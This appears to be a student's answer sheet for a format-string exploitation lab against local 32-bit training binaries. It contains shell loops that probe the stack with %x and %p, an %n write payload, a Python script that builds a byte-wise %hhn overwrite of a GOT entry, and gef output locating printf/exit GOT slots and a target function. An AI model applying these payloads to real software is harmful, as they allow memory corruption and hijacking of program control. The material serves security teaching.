# 1 Getting the basics 
### 1- 
the code should output `c AAAA 0x0000000a AAAA` Value = 23
### 2-

#  2 Practicing Format String Exploitation

1. `./vulnerable-1-32 "%x  32 fois"`
2. 
```bash
for i in $(seq 250); do
echo -n "$i: ";
./vulnerable-1-32 "$(echo -e "AAAABBB%64x%$i\$p")";
done

```

we added the BBB as padding to have our AAAA aligned in memory.
3.
```bash
#!/bin/sh  
for i in $(seq 250); do  
       echo -n "$i: ";  
       echo -e "AAAA%64x%$i\$p" | ./vulnerable-2-32  
done
```
`echo -e "\xcc\xb2\x04\x08%60x%7\$n" | ./vulnerable-2-32`
4.
```python

#!/usr/bin/env python 
import struct
import sys 
adr = 0x804b2f8 
p = struct.pack("I", adr) 
p += struct.pack("I", adr + 1) 
p += struct.pack("I", adr + 2) 
p += struct.pack("I", adr + 3) 
p += b"%1521x%26$hhn"
p += b"%1793x%25$hhn"
p += b"%83x%24$hhn" 
p += b"%1519x%23$hhn"
sys.stdout.buffer.write(p)
```
5.
```
gef➤  info variables _GLOBAL_OFFSET_TABLE_  
All variables matching regular expression "_GLOBAL_OFFSET_TABLE_":  
  
Non-debugging symbols:  
0x0804b2a0  _GLOBAL_OFFSET_TABLE_
gef➤  x/10gx 0x0804b2a0  
0x804b2a0:      0x000000000804b1a8      0xf7d6b39000000000  
0x804b2b0 <printf@got.plt>:     0xf7e33c60f7da1eb0      0xf7dc61a0f7dc4000  
0x804b2c0 <exit@got.plt>:       0x00000000f7d850c0      0x00000000f7e84740
gef➤  p bar  
$1 = {void (void)} 0x80491a6 <bar>
```
